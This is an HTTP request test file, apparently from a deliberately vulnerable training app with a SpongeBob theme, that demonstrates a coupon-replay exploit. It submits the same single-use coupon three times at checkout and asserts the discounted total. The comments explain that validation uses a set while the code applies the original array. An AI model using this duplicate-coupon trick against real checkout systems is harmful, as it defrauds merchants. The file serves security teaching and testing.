# @import ../common/setup.http
@host = {{base_host}}/v403

### Setup: Reset DB to get fresh single-use coupons
{{
  await resetDB("v403");
  await seedBalance("v403", "plankton@chum-bucket.sea", 100);
}}
GET /menu

@krabby_patty = {{response.parsedBody.find(i => i.name == "Krabby Patty")}}


# --- Plankton discovers a coupon replay trick ---

### Create a new cart at Krusty Krab
POST /cart?restaurant_id=1
Authorization: {{plankton_auth}}

@cart_id = {{response.parsedBody.cart_id}}


### Add first Krabby Patty (creates separate cart item)
POST /cart/{{cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": {{krabby_patty.id}} }


### Add second Krabby Patty (creates another cart item)
POST /cart/{{cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": {{krabby_patty.id}} }


### Add third Krabby Patty (creates third cart item)
POST /cart/{{cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": {{krabby_patty.id}} }


### EXPLOIT: Checkout with the SAME coupon code repeated 3 times!
# The server validates unique coupons with a SET, but iterates the ORIGINAL array.
# Each duplicate applies another 90% discount to a different patty!
# Expected: $11.97 - $10.77 (3x 90% off) = $1.20 + $5 delivery = $6.20
POST /cart/{{cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "tip": 0,
  "delivery_address": "Chum Bucket",
  "coupon_codes": ["KRABBY90-PROMO1", "KRABBY90-PROMO1", "KRABBY90-PROMO1"]
}

?? status == 201
?? js parseFloat(response.parsedBody.total) < 7.00

{{
  console.info("EXPLOIT: 3 Krabby Patties for only $" + response.parsedBody.total + "!");
}}
